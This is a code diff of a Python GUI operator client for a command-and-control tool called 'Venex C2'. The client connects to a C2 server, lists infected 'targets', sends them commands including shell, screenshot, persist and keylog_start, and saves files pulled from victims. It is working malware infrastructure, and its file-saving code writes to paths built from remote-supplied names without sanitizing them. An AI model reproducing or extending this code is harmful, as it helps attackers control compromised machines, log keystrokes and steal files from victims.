+            # Split only the first two ':' so binary data stays intact
+            filename, extension, file_data = payload.split(b":", 2)
 
-                filename = filename.rsplit(b"\\", 1)[0] if b"\\" in filename else filename.rsplit(b"/", 1)[0]
-                
+            # Convert filename and extension from bytes to string
+            filename = filename.decode("utf-8")
+            extension = extension.decode("utf-8")
 
-                filename = filename.decode('utf-8')
-                ext = ext.decode('utf-8')
+            # Build full file path
+            full_filename = f"content_box/{filename}.{extension}"
 
-                # Convert Base64 → raw bytes
-                file_bytes = b64data
+            # Write binary data to file
+            with open(full_filename, "wb") as f:
+                f.write(file_data)
 
-                # Create filename
-                filename = f"D:\\linuxmal\\C2Client\\content_box\\{filename}.{ext.lower()}"
+            self.gui_queue.put((self.log_message, (f"$$-> Received file: {full_filename} saved",)))
 
-                # Save file
-                with open(filename, "wb") as f:
-                    f.write(file_bytes)
 
-                self.log_message(f"Saved file as {filename}")
-                # Refresh file explorer to show new file
-                self.refresh_file_explorer()
-
-            except Exception as e:
-                self.log_message(f"Error handling WRITE message: {e}")
         else:
-            self.gui_queue.put((self.log_message, (f"Received: {message.decode("utf-8")}",)))
+            self.gui_queue.put((self.log_message, (f"← {message.decode(errors='ignore')}",)))
 
-    def add_target(self, target_id):
+    def add_target(self, tid):
         with self.target_lock:
-
-            if target_id not in self.targets:
-                # Create new entry
-                self.targets[target_id] = {
-                    "last_seen": datetime.now(),
-                    "status": "Active"
-                }
-
-                # Add to treeview via queue
-                self.gui_queue.put((self._add_target_to_tree, (target_id,)))
-                self.gui_queue.put((self.log_message, (f"New target connected: {target_id}",)))
+            if tid not in self.targets:
+                self.targets[tid] = {"last": datetime.now(), "status": "Active"}
+                self.gui_queue.put((self._add_target_to_tree, (tid,)))
             else:
-                # Update existing entry
-                self.targets[target_id]["last_seen"] = datetime.now()
-                self.gui_queue.put((self._update_target_in_tree, (target_id,)))
+                self.targets[tid]["last"] = datetime.now()
+                self.gui_queue.put((self._update_target_in_tree, (tid,)))
 
-    def update_target(self, target_id):
-        with self.target_lock:
-            if target_id in self.targets:
-                self.targets[target_id]["last_seen"] = datetime.now()
-                self.targets[target_id]["status"] = "Active"
-                
-                # Update treeview via queue
-                self.gui_queue.put((self._update_target_in_tree, (target_id,)))
+    def _add_target_to_tree(self, tid):
+        self.targets_tree.insert("", "end", values=(tid, datetime.now().strftime("%H:%M:%S"), "Active"))
 
-    def remove_target(self, target_id):
-        with self.target_lock:
-            if target_id in self.targets:
-                del self.targets[target_id]
-                
-                # Remove from treeview via queue
-                self.gui_queue.put((self._remove_target_from_tree, (target_id,)))
-                self.gui_queue.put((self.log_message, (f"Target removed: {target_id}",)))
-                
-                # If we were interacting with this target, switch to normal mode
-                if self.interacting_with_target == target_id:
-                    self.gui_queue.put((self.switch_to_normal_mode, ()))
+    def _update_target_in_tree(self, tid):
+        for item in self.targets_tree.get_children():
+            if self.targets_tree.item(item, "values")[0] == tid:
+                self.targets_tree.item(item, values=(tid, datetime.now().strftime("%H:%M:%S"), "Active"))
 
     def _clear_targets_tree(self):
-        """Clear all items from the targets treeview"""
+        for i in self.targets_tree.get_children(): self.targets_tree.delete(i)
+
+    def show_target_menu(self, event):
+        item = self.targets_tree.identify_row(event.y)
+        if item:
+            self.targets_tree.selection_set(item)
+            self.target_menu.post(event.x_root, event.y_root)
+
+    def interact_with_target(self):
+        sel = self.targets_tree.selection()
+        if sel:
+            tid = self.targets_tree.item(sel[0], "values")[0]
+            self.interacting_with_target = tid
+            self.mode_label.configure(text=f"MODE: INTERACTING WITH {tid}", text_color=ACCENT_BLUE)
+            self.log_message(f"Interacting with {tid}")
+            self.current_commands = self.target_commands
+
+    def switch_to_normal_mode(self):
+        self.interacting_with_target = None
+        self.mode_label.configure(text="MODE: C2 SERVER", text_color=TEXT_SECONDARY)
+        self.log_message("Switched to normal mode")
+        self.current_commands = self.global_commands
+
+    def log_message(self, msg):
+        ts = datetime.now().strftime("%H:%M:%S")
+        self.log_text.insert(tk.END, f"[{ts}] {msg}\n")
+        self.log_text.see(tk.END)
+
+    def log_data_message(self, msg):
+        self.output_text.insert(tk.END, f"{msg}\n")
+        self.output_text.see(tk.END)
+
+    # --- File Explorer Logic ---
+    def refresh_file_explorer(self):
+        for i in self.files_tree.get_children(): self.files_tree.delete(i)
+        self.path_entry.delete(0, tk.END); self.path_entry.insert(0, self.current_path)
+        try:
+            for item in os.listdir(self.current_path):
+                p = os.path.join(self.current_path, item)
+                s = os.stat(p)
+                mod = datetime.fromtimestamp(s.st_mtime).strftime("%Y-%m-%d %H:%M")
+                if os.path.isdir(p): self.files_tree.insert("", "end", values=(f"📁 {item}", "--", "Folder", mod))
+                else: self.files_tree.insert("", "end", values=(f"📄 {item}", f"{s.st_size/1024:.1f} KB", "File", mod))
+        except: pass
+
+    def on_file_double_click(self, e):
+        sel = self.files_tree.selection()
+        if not sel: return
+        name = self.files_tree.item(sel[0])['values'][0][2:]
+        path = os.path.join(self.current_path, name)
+        if os.path.isdir(path): self.current_path = path; self.refresh_file_explorer()
+        else: self.open_file(path)
+
+    def go_up_directory(self):
+        self.current_path = os.path.dirname(self.current_path)
+        self.refresh_file_explorer()
+
+    def open_file(self, p):
+        try:
+            if platform.system() == 'Windows': os.startfile(p)
+            else: subprocess.run(['xdg-open', p])
+        except: pass
+
+    def delete_selected_file(self):
+        sel = self.files_tree.selection()
+        if not sel: return
+        name = self.files_tree.item(sel[0])['values'][0][2:]
+        path = os.path.join(self.current_path, name)
+        if messagebox.askyesno("Confirm", f"Delete {name}?"):
+            try:
+                if os.path.isdir(path): shutil.rmtree(path)
+                else: os.remove(path)
+                self.refresh_file_explorer()
+            except: pass
+
+    def is_ip(self, s):
+        try: ipaddress.ip_address(s); return True
+        except: return False
+
+    def cleanup_old_targets(self):
+        while True:
+            time.sleep(30)
+            if not self.connected: continue
+            now = datetime.now()
+            with self.target_lock:
+                to_remove = [tid for tid, info in self.targets.items() if now - info["last"] > timedelta(minutes=5)]
+                for tid in to_remove:
+                    del self.targets[tid]
+                    self.gui_queue.put((self._remove_target_from_tree, (tid,)))
+            if to_remove and self.interacting_with_target in to_remove:
+                self.gui_queue.put((self.switch_to_normal_mode, ()))
+
+    def _remove_target_from_tree(self, tid):
         for item in self.targets_tree.get_children():
-            self.targets_tree.delete(item)
-
-    def _add_target_to_tree(self, target_id):
-        with self.target_lock:
-            if target_id in self.targets:
-                target = self.targets[target_id]
-                self.targets_tree.insert("", "end", values=(
-                    target_id, 
-                    target["last_seen"].strftime("%H:%M:%S"),
-                    target["status"]
-                ))
-
-    def _update_target_in_tree(self, target_id):
-        with self.target_lock:
-            if target_id in self.targets:
-                target = self.targets[target_id]
-                
-                # Find the item in the treeview
-                for item in self.targets_tree.get_children():
-                    if self.targets_tree.item(item, "values")[0] == target_id:
-                        self.targets_tree.item(item, values=(
-                            target_id,
-                            target["last_seen"].strftime("%H:%M:%S"),
-                            target["status"]
-                        ))
-                        break
-
-    def _remove_target_from_tree(self, target_id):
-        # Find and remove the item from the treeview
-        for item in self.targets_tree.get_children():
-            if self.targets_tree.item(item, "values")[0] == target_id:
+            if self.targets_tree.item(item, "values")[0] == tid:
                 self.targets_tree.delete(item)
                 break
 
-    def cleanup_old_targets(self):
-        """Remove targets that haven't been seen in 5 minutes"""
-        while True:
-            time.sleep(30)  # Check every 30 seconds
-            
-            if not self.connected:
-                continue
-                
-            now = datetime.now()
-            to_remove = []
-            
-            with self.target_lock:
-                for target_id, target_info in self.targets.items():
-                    if now - target_info["last_seen"] > timedelta(minutes=5):
-                        to_remove.append(target_id)
-            
-            for target_id in to_remove:
-                self.remove_target(target_id)
+    def process_gui_updates(self):
+        while not self.gui_queue.empty():
+            func, args = self.gui_queue.get()
+            func(*args)
+        self.after(100, self.process_gui_updates)
 
-    def log_message(self, message):
-        """Log general messages to the left message window"""
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        self.messages_text.insert(tk.END, f"[{timestamp}] {message}\n")
-        self.messages_text.see(tk.END)
+    # === AUTOCOMPLETE LOGIC ===
+    def clear_ghost(self):
+        try:
+            self.internal_entry.selection_clear()
+        except tk.TclError:
+            pass
 
-    def log_data_message(self, message):
-        """Log DATA messages to the right message window"""
-        self.data_messages_text.insert(tk.END, f"{message}\n")
-        self.data_messages_text.see(tk.END)
+    def update_suggestion(self):
+        # We don't clear ghost here anymore because it's handled by selection management
+        actual_text = self.cmd_entry.get()
 
-    def __del__(self):
-        self.connected = False
-        if self.socket:
-            self.socket.close()
+        # If there's a selection, the "actual text" is what's before the selection
+        if self.internal_entry.selection_present():
+            sel_start = self.internal_entry.index("sel.first")
+            actual_text = actual_text[:sel_start]
+
+        if not actual_text: # or " " in actual_text:
+            return
+
+        lower_text = actual_text.lower()
+        matches = [cmd for cmd in self.current_commands if cmd.lower().startswith(lower_text)]
+        
+        if not matches:
+            return
+
+        # Find the best match (shortest one that starts with the text)
+        suggestion = min(matches, key=len)
+
+        # If the suggestion is exactly what we typed, no need to show it as a ghost
+        if suggestion.lower() == lower_text:
+            return
+
+        # Update the entry: keep what user typed, append the rest as selected text
+        self.cmd_entry.delete(0, tk.END)
+        self.cmd_entry.insert(0, suggestion)
+        
+        typed_len = len(actual_text)
+        self.internal_entry.icursor(typed_len)
+        self.internal_entry.selection_range(typed_len, tk.END)
+
+    def on_key_release(self, event):
+        # Ignore navigation and control keys
+        if event.keysym in {"Tab", "Return", "Left", "Right", "Up", "Down", 
+                           "Shift_L", "Shift_R", "Control_L", "Control_R", 
+                           "BackSpace", "Escape", "Caps_Lock", "space"}:
+            return
+        
+        self.update_suggestion()
+
+    def on_backspace(self, event):
+        if self.internal_entry.selection_present():
+            # If ghost text is present, backspace should just remove the ghost text
+            # and then let the default backspace handle the last character of actual text
+            sel_start = self.internal_entry.index("sel.first")
+            self.cmd_entry.delete(sel_start, tk.END)
+            self.internal_entry.icursor(sel_start)
+            # We don't return "break" here, so the default backspace deletes the char before sel_start
+            # But we need to update suggestions after that happens
+            self.after(1, self.update_suggestion)
+            return
+        
+        # Standard backspace: just update suggestions after the character is deleted
+        self.after(1, self.update_suggestion)
+
+    def on_tab(self, event):
+        if self.internal_entry.selection_present():
+            # Accept the suggestion
+            self.internal_entry.icursor(tk.END)
+            self.internal_entry.selection_clear()
+            return "break"
+        return "break"
+
+    def on_right_arrow(self, event):
+        if self.internal_entry.selection_present():
+            # Accept the suggestion
+            self.internal_entry.icursor(tk.END)
+            self.internal_entry.selection_clear()
+            return "break"
+        
+    def on_close(self):
+
+        if self.auth_token.get():
+            self.save_config("auth_token", self.sha256_token)
+        if self.server_ip.get():
+            self.save_config("server_ip", self.server_ip.get())
+        if self.server_port.get():
+            self.save_config("server_port", str(self.server_port.get()))
+        
+        # Close socket if connected
+        if self.connected:
+            self.connected = False
+            if self.socket:
+                self.socket.close()
+        self.destroy()
+
+
 
 if __name__ == "__main__":
-    root = tk.Tk()
-    app = C2Client(root)
-    root.protocol("WM_DELETE_WINDOW", root.quit)
-    root.mainloop()
+    app = PremiumC2Client()
+    app.mainloop()
+
+
+# import base64
+# import hashlib
+# import socket
+# import threading
+# import time
+# import tkinter as tk
+# from tkinter import messagebox, filedialog, ttk
+# import customtkinter as ctk
+# from datetime import datetime, timedelta
+# from queue import Queue
+# import re
+# import ipaddress
+# import os
+# import subprocess
+# import platform
+# import shutil
+
+# # --- Premium Windows 11 Styling ---
+# ctk.set_appearance_mode("Dark")
+# ctk.set_default_color_theme("blue")
+
+# # Color Palette
+# ACCENT_BLUE = "#0078d4"
+# ACCENT_HOVER = "#005a9e"
+# BG_DARK = "#202020"
+# CARD_DARK = "#2b2b2b"
+# TEXT_PRIMARY = "#ffffff"
+# TEXT_SECONDARY = "#a0a0a0"
+# SUCCESS_GREEN = "#22DD22"
+# DANGER_RED = "#d13438"
+
+# class PremiumC2Client(ctk.CTk):
+#     def __init__(self):
+#         super().__init__()
+#         # Window configuration
+#         self.title("Venex C2 - Windows 11 Edition")
+#         self.geometry("1400x900")
+#         self.minsize(1100, 750)
+#         self.configure(fg_color=BG_DARK)
+
+#         # Logic Variables
+#         self.server_ip = tk.StringVar(value="127.0.0.1")
+#         self.server_port = tk.IntVar(value=7777)
+#         self.auth_token = tk.StringVar(value="your token")
+#         self.connected = False
+#         self.socket = None
+#         self.targets = {}
+#         self.target_lock = threading.Lock()
+#         self.interacting_with_target = None
+#         self.gui_queue = Queue()
+#         self.content_box_path = os.path.join(os.getcwd(), "content_box")
+#         self.current_path = self.content_box_path
+#         if not os.path.exists(self.content_box_path):
+#             os.makedirs(self.content_box_path)
+
+#         # === AUTOCOMPLETE COMMAND LISTS ===
+#         self.global_commands = ["help", "interact", "targets", "clear", "list", "exit"]
+#         self.target_commands = ["back", "sysinfo", "screenshot", "shell", "upload", "download",
+#                                "pwd", "ls", "cd", "persist", "keylog_start", "keylog_stop", "help"]
+#         self.current_commands = self.global_commands  # default mode
+
+#         # Setup UI
+#         self.setup_premium_ui()
+
+#         # Background processes
+#         self.cleanup_thread = threading.Thread(target=self.cleanup_old_targets, daemon=True)
+#         self.cleanup_thread.start()
+#         self.after(100, self.process_gui_updates)
+#         self.refresh_file_explorer()
+
+#     def setup_premium_ui(self):
+#         self.grid_columnconfigure(1, weight=1)
+#         self.grid_rowconfigure(0, weight=1)
+
+#         # --- Sidebar Navigation ---
+#         self.sidebar = ctk.CTkFrame(self, width=260, corner_radius=0, fg_color="#1a1a1a")
+#         self.sidebar.grid(row=0, column=0, rowspan=2, sticky="nsew")
+#         self.sidebar.grid_rowconfigure(4, weight=1)
+
+#         # Logo
+#         self.logo_label = ctk.CTkLabel(self.sidebar, text="VENEX C2", font=ctk.CTkFont(size=24, weight="bold"))
+#         self.logo_label.grid(row=0, column=0, padx=30, pady=(40, 30))
+
+#         # Nav Buttons
+#         self.btn_dashboard = self.create_nav_button("Dashboard", "📊", 1, self.show_dashboard)
+#         self.btn_content = self.create_nav_button("Content Box", "📁", 2, self.show_content)
+#         self.btn_settings = self.create_nav_button("Settings", "⚙️", 3, self.show_settings)
+
+#         # Sidebar Footer
+#         self.status_indicator = ctk.CTkLabel(self.sidebar, text="● Disconnected", text_color=DANGER_RED, font=ctk.CTkFont(size=12))
+#         self.status_indicator.grid(row=5, column=0, padx=30, pady=(0, 20), sticky="w")
+
+#         # --- Main Content Area ---
+#         self.main_area = ctk.CTkFrame(self, corner_radius=20, fg_color=BG_DARK)
+#         self.main_area.grid(row=0, column=1, sticky="nsew", padx=30, pady=30)
+#         self.main_area.grid_columnconfigure(0, weight=1)
+#         self.main_area.grid_rowconfigure(1, weight=1)
+
+#         # Top Bar (Connection)
+#         self.top_bar = ctk.CTkFrame(self.main_area, fg_color="transparent")
+#         self.top_bar.grid(row=0, column=0, sticky="ew", pady=(0, 20))
+
+#         conn_card = ctk.CTkFrame(self.top_bar, fg_color=CARD_DARK, corner_radius=12, height=70)
+#         conn_card.pack(fill="x")
+
+#         ctk.CTkLabel(conn_card, text="Server:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(20, 5))
+#         self.ip_entry = ctk.CTkEntry(conn_card, textvariable=self.server_ip, width=150, border_width=0, fg_color="#3d3d3d")
+#         self.ip_entry.pack(side="left", padx=5, pady=15)
+
+#         ctk.CTkLabel(conn_card, text="Port:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(15, 5))
+#         self.port_entry = ctk.CTkEntry(conn_card, textvariable=self.server_port, width=80, border_width=0, fg_color="#3d3d3d")
+#         self.port_entry.pack(side="left", padx=5, pady=15)
+
+#         self.connect_btn = ctk.CTkButton(conn_card, text="Connect", command=self.toggle_connection,
+#                                         fg_color=ACCENT_BLUE, hover_color=ACCENT_HOVER, corner_radius=8, width=120, font=ctk.CTkFont(weight="bold"))
+#         self.connect_btn.pack(side="right", padx=20, pady=15)
+
+#         # Views Container
+#         self.views = {}
+#         self.setup_dashboard_view()
+#         self.setup_content_view()
+#         self.setup_settings_view()
+
+#         self.show_dashboard()
+
+#         # --- Bottom Command Bar ---
+#         self.cmd_bar = ctk.CTkFrame(self, height=120, fg_color="#1a1a1a", corner_radius=0)
+#         self.cmd_bar.grid(row=1, column=1, sticky="ew")
+#         self.cmd_bar.grid_columnconfigure(0, weight=1)
+
+#         self.mode_label = ctk.CTkLabel(self.cmd_bar, text="MODE: C2 SERVER", font=ctk.CTkFont(size=11, weight="bold"), text_color=TEXT_SECONDARY)
+#         self.mode_label.grid(row=0, column=0, padx=30, pady=(15, 0), sticky="w")
+
+#         cmd_input_container = ctk.CTkFrame(self.cmd_bar, fg_color="transparent")
+#         cmd_input_container.grid(row=1, column=0, sticky="ew", padx=30, pady=(5, 20))
+#         cmd_input_container.grid_columnconfigure(0, weight=1)
+
+#         self.cmd_entry = ctk.CTkEntry(cmd_input_container, placeholder_text="Type a command (e.g., help, interact ID)...",
+#                                      height=45, corner_radius=10, border_width=1, border_color="#3d3d3d", fg_color="#252525")
+#         self.cmd_entry.grid(row=0, column=0, sticky="ew", padx=(0, 15))
+#         self.cmd_entry.configure(font=("Consolas", 13))
+
+#         self.send_btn = ctk.CTkButton(cmd_input_container, text="Execute", command=self.send_command,
+#                                      width=100, height=45, corner_radius=10, fg_color=ACCENT_BLUE)
+#         self.send_btn.grid(row=0, column=1)
+
+#         # === AUTOCOMPLETE SETUP ===
+#         self.internal_entry = self.cmd_entry._entry
+#         self.internal_entry.configure(
+#             selectbackground="#252525",
+#             selectforeground="#cccccc"    # bright ghost text
+#         )
+
+#         self.internal_entry.bind("<KeyRelease>", self.on_key_release)
+#         self.internal_entry.bind("<BackSpace>", self.on_backspace)
+#         self.internal_entry.bind("<Tab>", self.on_tab)
+#         self.internal_entry.bind("<Right>", self.on_right_arrow)
+#         self.internal_entry.bind("<Return>", lambda e: self.send_command())
+
+#     def create_nav_button(self, text, icon, row, command):
+#         btn = ctk.CTkButton(self.sidebar, text=f" {icon} {text}", anchor="w", height=45,
+#                            fg_color="transparent", hover_color="#2d2d2d", corner_radius=8,
+#                            font=ctk.CTkFont(size=14), command=command)
+#         btn.grid(row=row, column=0, padx=20, pady=5, sticky="ew")
+#         return btn
+
+#     def setup_dashboard_view(self):
+#         view = ctk.CTkFrame(self.main_area, fg_color="transparent")
+#         self.views["dashboard"] = view
+#         view.grid_columnconfigure(0, weight=2)
+#         view.grid_columnconfigure(1, weight=1)
+#         view.grid_rowconfigure(0, weight=1)
+
+#         left_col = ctk.CTkFrame(view, fg_color="transparent")
+#         left_col.grid(row=0, column=0, sticky="nsew", padx=(0, 20))
+#         left_col.grid_columnconfigure(0, weight=1)
+#         left_col.grid_rowconfigure(0, weight=1)
+#         left_col.grid_rowconfigure(1, weight=1)
+
+#         target_card = ctk.CTkFrame(left_col, fg_color=CARD_DARK, corner_radius=15)
+#         target_card.grid(row=0, column=0, sticky="nsew", pady=(0, 20))
+#         target_card.grid_columnconfigure(0, weight=1)
+#         target_card.grid_rowconfigure(1, weight=1)
+
+#         ctk.CTkLabel(target_card, text="Active Targets", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
+
+#         style = ttk.Style()
+#         style.theme_use("clam")
+#         style.configure("Treeview", background=CARD_DARK, foreground=TEXT_PRIMARY, fieldbackground=CARD_DARK, borderwidth=0, rowheight=40)
+#         style.map("Treeview", background=[('selected', ACCENT_BLUE)])
+
+#         self.targets_tree = ttk.Treeview(target_card, columns=("id", "last", "status"), show="headings")
+#         self.targets_tree.heading("id", text="TARGET ID")
+#         self.targets_tree.heading("last", text="LAST SEEN")
+#         self.targets_tree.heading("status", text="STATUS")
+#         self.targets_tree.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))
+
+#         self.target_menu = tk.Menu(self, tearoff=0, bg=CARD_DARK, fg=TEXT_PRIMARY, borderwidth=0)
+#         self.target_menu.add_command(label="Interact", command=self.interact_with_target)
+#         self.targets_tree.bind("<Button-3>", self.show_target_menu)
+
+#         output_card = ctk.CTkFrame(left_col, fg_color=CARD_DARK, corner_radius=15)
+#         output_card.grid(row=1, column=0, sticky="nsew")
+#         output_card.grid_columnconfigure(0, weight=1)
+#         output_card.grid_rowconfigure(1, weight=1)
+
+#         ctk.CTkLabel(output_card, text="Terminal Output", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
+#         self.output_text = ctk.CTkTextbox(output_card, fg_color="#1a1a1a", text_color=SUCCESS_GREEN, font=("Consolas", 13), corner_radius=10)
+#         self.output_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))
+
+#         log_card = ctk.CTkFrame(view, fg_color=CARD_DARK, corner_radius=15)
+#         log_card.grid(row=0, column=1, sticky="nsew")
+#         log_card.grid_columnconfigure(0, weight=1)
+#         log_card.grid_rowconfigure(1, weight=1)
+
+#         ctk.CTkLabel(log_card, text="System Logs", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
+#         self.log_text = ctk.CTkTextbox(log_card, fg_color="#1a1a1a", text_color=TEXT_SECONDARY, font=("Segoe UI", 11), corner_radius=10)
+#         self.log_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))
+
+#     def setup_content_view(self):
+#         view = ctk.CTkFrame(self.main_area, fg_color="transparent")
+#         self.views["content"] = view
+#         view.grid_columnconfigure(0, weight=1)
+#         view.grid_rowconfigure(1, weight=1)
+
+#         explorer_card = ctk.CTkFrame(view, fg_color=CARD_DARK, corner_radius=15)
+#         explorer_card.grid(row=0, column=0, rowspan=2, sticky="nsew")
+#         explorer_card.grid_columnconfigure(0, weight=1)
+#         explorer_card.grid_rowconfigure(1, weight=1)
+
+#         toolbar = ctk.CTkFrame(explorer_card, fg_color="transparent")
+#         toolbar.grid(row=0, column=0, sticky="ew", padx=20, pady=15)
+
+#         self.path_entry = ctk.CTkEntry(toolbar, fg_color="#3d3d3d", border_width=0, height=35)
+#         self.path_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))
+
+#         ctk.CTkButton(toolbar, text="Refresh", width=80, height=35, command=self.refresh_file_explorer).pack(side="left", padx=5)
+#         ctk.CTkButton(toolbar, text="Up", width=60, height=35, command=self.go_up_directory).pack(side="left", padx=5)
+#         ctk.CTkButton(toolbar, text="Delete", width=80, height=35, fg_color=DANGER_RED, hover_color="#a4262c", command=self.delete_selected_file).pack(side="left", padx=5)
+
+#         self.files_tree = ttk.Treeview(explorer_card, columns=("name", "size", "type", "mod"), show="headings")
+#         self.files_tree.heading("name", text="NAME")
+#         self.files_tree.heading("size", text="SIZE")
+#         self.files_tree.heading("type", text="TYPE")
+#         self.files_tree.heading("mod", text="MODIFIED")
+#         self.files_tree.grid(row=1, column=0, sticky="nsew", padx=20, pady=(0, 20))
+#         self.files_tree.bind("<Double-1>", self.on_file_double_click)
+
+#     def setup_settings_view(self):
+#         view = ctk.CTkFrame(self.main_area, fg_color=CARD_DARK, corner_radius=15)
+#         self.views["settings"] = view
+
+#         ctk.CTkLabel(view, text="Settings", font=ctk.CTkFont(size=24, weight="bold")).pack(padx=40, pady=(40, 20), anchor="w")
+
+#         ctk.CTkLabel(view, text="Appearance Mode", font=ctk.CTkFont(weight="bold")).pack(padx=40, pady=(20, 5), anchor="w")
+#         self.theme_opt = ctk.CTkOptionMenu(view, values=["Dark", "Light", "System"], command=lambda m: ctk.set_appearance_mode(m))
+#         self.theme_opt.pack(padx=40, pady=10, anchor="w")
+
+#         ctk.CTkLabel(view, text="Authentication Token", font=ctk.CTkFont(weight="bold")).pack(padx=40, pady=(20, 5), anchor="w")
+#         self.token_entry_set = ctk.CTkEntry(view, textvariable=self.auth_token, width=300, show="*")
+#         self.token_entry_set.pack(padx=40, pady=10, anchor="w")
+
+#     def show_dashboard(self): self.switch_view("dashboard", self.btn_dashboard)
+#     def show_content(self): self.switch_view("content", self.btn_content)
+#     def show_settings(self): self.switch_view("settings", self.btn_settings)
+
+#     def switch_view(self, name, btn):
+#         for v in self.views.values(): v.grid_forget()
+#         self.views[name].grid(row=1, column=0, sticky="nsew")
+
+#         for b in [self.btn_dashboard, self.btn_content, self.btn_settings]:
+#             b.configure(fg_color="transparent", text_color=TEXT_PRIMARY)
+#         btn.configure(fg_color=ACCENT_BLUE, text_color="white")
+
+#     def toggle_connection(self):
+#         if not self.connected: self.connect_to_server()
+#         else: self.disconnect_from_server()
+
+#     def connect_to_server(self):
+#         host = self.server_ip.get()
+#         try:
+#             ip = host if self.is_ip(host) else socket.gethostbyname(host)
+#             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#             self.socket.connect((ip, self.server_port.get()))
+#             self.connected = True
+
+#             sha256_token = hashlib.sha256(self.auth_token.get().encode('utf-8')).hexdigest()
+#             self.socket.sendall(f"TOKEN:{sha256_token}".encode("utf-8"))
+#             self.connect_btn.configure(text="Disconnect", fg_color=DANGER_RED)
+#             self.status_indicator.configure(text="● Connected", text_color=SUCCESS_GREEN)
+
+#             threading.Thread(target=self.receive_messages, daemon=True).start()
+#             self.log_message(f"Connected to {ip}")
+#         except Exception as e:
+#             messagebox.showerror("Error", f"Connection failed: {e}")
+
+#     def disconnect_from_server(self):
+#         self.connected = False
+#         if self.socket: self.socket.close()
+#         self.connect_btn.configure(text="Connect", fg_color=ACCENT_BLUE)
+#         self.status_indicator.configure(text="● Disconnected", text_color=DANGER_RED)
+#         self.log_message("Disconnected")
+#         self.switch_to_normal_mode()
+#         with self.target_lock:
+#             self.targets.clear()
+#             self.gui_queue.put((self._clear_targets_tree, ()))
+
+#     def send_command(self, event=None):
+#         cmd = self.cmd_entry.get().strip()
+#         if not cmd or not self.connected: return
+#         try:
+#             f_cmd = f"TARGET:{self.interacting_with_target}:{cmd}" if self.interacting_with_target else cmd
+#             self.socket.sendall((f_cmd + "\n").encode())
+#             self.cmd_entry.delete(0, tk.END)
+#             self.log_message(f"Sent: {f_cmd}")
+#             self.clear_ghost()
+#         except Exception as e:
+#             self.log_message(f"Error sending: {e}")
+
+#     def receive_messages(self):
+#         buffer = b""
+#         while self.connected:
+#             try:
+#                 data = self.socket.recv(4096)
+#                 if not data: break
+#                 buffer += data
+#                 while b"END_OF" in buffer:
+#                     line, buffer = buffer.split(b"END_OF", 1)
+#                     if line.strip(): self.process_message(line.strip())
+#             except: break
+#         self.gui_queue.put((self.disconnect_from_server, ()))
+
+#     def process_message(self, message):
+#         if message.startswith(b"TARGET:"):
+#             self.add_target(message[7:].strip().decode('utf-8'))
+#         elif message.startswith(b"/DATA:"):
+#             text = message[6:].decode('utf-8')
+#             self.gui_queue.put((self.log_data_message, (f"$$-> {text}",)))
+#         elif message.startswith(b"/WRITE:"):
+#             pass
+#         else:
+#             self.gui_queue.put((self.log_message, (f"← {message.decode(errors='ignore')}",)))
+
+#     def add_target(self, tid):
+#         with self.target_lock:
+#             if tid not in self.targets:
+#                 self.targets[tid] = {"last": datetime.now(), "status": "Active"}
+#                 self.gui_queue.put((self._add_target_to_tree, (tid,)))
+#             else:
+#                 self.targets[tid]["last"] = datetime.now()
+#                 self.gui_queue.put((self._update_target_in_tree, (tid,)))
+
+#     def _add_target_to_tree(self, tid):
+#         self.targets_tree.insert("", "end", values=(tid, datetime.now().strftime("%H:%M:%S"), "Active"))
+
+#     def _update_target_in_tree(self, tid):
+#         for item in self.targets_tree.get_children():
+#             if self.targets_tree.item(item, "values")[0] == tid:
+#                 self.targets_tree.item(item, values=(tid, datetime.now().strftime("%H:%M:%S"), "Active"))
+
+#     def _clear_targets_tree(self):
+#         for i in self.targets_tree.get_children(): self.targets_tree.delete(i)
+
+#     def show_target_menu(self, event):
+#         item = self.targets_tree.identify_row(event.y)
+#         if item:
+#             self.targets_tree.selection_set(item)
+#             self.target_menu.post(event.x_root, event.y_root)
+
+#     def interact_with_target(self):
+#         sel = self.targets_tree.selection()
+#         if sel:
+#             tid = self.targets_tree.item(sel[0], "values")[0]
+#             self.interacting_with_target = tid
+#             self.mode_label.configure(text=f"MODE: INTERACTING WITH {tid}", text_color=ACCENT_BLUE)
+#             self.log_message(f"Interacting with {tid}")
+#             self.current_commands = self.target_commands
+#             self.cmd_entry.delete(0, tk.END)
+#             self.clear_ghost()
+
+#     def switch_to_normal_mode(self):
+#         self.interacting_with_target = None
+#         self.mode_label.configure(text="MODE: C2 SERVER", text_color=TEXT_SECONDARY)
+#         self.current_commands = self.global_commands
+#         self.clear_ghost()
+
+#     def log_message(self, msg):
+#         ts = datetime.now().strftime("%H:%M:%S")
+#         self.log_text.insert(tk.END, f"[{ts}] {msg}\n")
+#         self.log_text.see(tk.END)
+
+#     def log_data_message(self, msg):
+#         self.output_text.insert(tk.END, f"{msg}\n")
+#         self.output_text.see(tk.END)
+
+#     def refresh_file_explorer(self):
+#         for i in self.files_tree.get_children(): self.files_tree.delete(i)
+#         self.path_entry.delete(0, tk.END); self.path_entry.insert(0, self.current_path)
+#         try:
+#             for item in os.listdir(self.current_path):
+#                 p = os.path.join(self.current_path, item)
+#                 s = os.stat(p)
+#                 mod = datetime.fromtimestamp(s.st_mtime).strftime("%Y-%m-%d %H:%M")
+#                 if os.path.isdir(p):
+#                     self.files_tree.insert("", "end", values=(f"📁 {item}", "--", "Folder", mod))
+#                 else:
+#                     self.files_tree.insert("", "end", values=(f"📄 {item}", f"{s.st_size/1024:.1f} KB", "File", mod))
+#         except: pass
+
+#     def on_file_double_click(self, e):
+#         sel = self.files_tree.selection()
+#         if not sel: return
+#         name = self.files_tree.item(sel[0])['values'][0][2:]
+#         path = os.path.join(self.current_path, name)
+#         if os.path.isdir(path):
+#             self.current_path = path
+#             self.refresh_file_explorer()
+#         else:
+#             self.open_file(path)
+
+#     def go_up_directory(self):
+#         self.current_path = os.path.dirname(self.current_path)
